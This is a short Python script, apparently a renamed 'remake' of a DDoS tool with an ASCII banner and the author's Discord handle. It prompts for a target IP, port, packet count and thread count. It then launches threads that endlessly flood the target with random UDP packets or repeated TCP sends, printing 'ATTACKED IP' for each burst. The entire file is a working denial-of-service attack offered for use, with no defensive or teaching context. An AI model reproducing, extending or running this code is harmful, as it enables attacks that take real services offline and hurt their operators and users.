#!/usr/bin/env python3
import random
import socket
import threading

print("""\033[91m

                 RAMEKE BY K4NDAR
██╗░░██╗░░██╗██╗███╗░░██╗██████╗░░█████╗░██████╗░
██║░██╔╝░██╔╝██║████╗░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░██╔╝░██║██╔██╗██║██║░░██║███████║██████╔╝
██╔═██╗░███████║██║╚████║██║░░██║██╔══██║██╔══██╗
██║░╚██╗╚════██║██║░╚███║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")

print       (" - - > AUTHOR : K4NDAR    CODE : K4NDAR < - - ")
print       ("- - > REMAKE BY K4NDAR")
print       (" - - > DISCORD ID : Iskandar#2007 <- - ")                                   
    
ip = str(input("  Ip :"))
port = int(input(" Port :"))
choice = str(input(" DDOS? (y/n):"))
times = int(input(" PACKET :"))
threads = int(input(" THREADS :"))
def run():
	data = random._urandom(1025)
	i = random.choice(("[=>]","[<=]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m ATTACKED IP %s AND THROUGH THE PORT %s"%(ip,port))
		except:
			print("[X] ERROR SERVER TIME OUT!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[=>]","[<=]","[=>]","[<=]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m ATTACKED IP %s AND THROUGH THE PORT %s"%(ip,port))
		except:
			s.close()
			print("[X] ERROR SERVER TIME OUT!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
